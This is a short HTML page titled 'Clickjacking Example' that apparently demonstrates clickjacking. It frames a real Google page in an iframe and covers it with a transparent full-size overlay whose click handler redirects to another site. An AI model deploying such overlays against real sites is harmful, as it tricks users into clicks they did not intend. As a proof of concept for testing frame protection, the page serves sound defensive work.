<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Example</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        .iframe-container {
            position: relative;
            width: 90%;
            height: 90vh;
            border: 2px solid #ccc;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        .click-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: transparent;
            cursor: pointer;
            z-index: 10;
        }
        .hidden-link {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.1);
            cursor: pointer;
            z-index: 20;
        }
    </style>
</head>
<body>

<div class="iframe-container">
    <iframe src="https://searchplayground.google/" title="Example Iframe"></iframe>
    <div class="click-overlay" onclick="window.location='https://www.facebook.com';"></div>
</div>

</body>
</html>
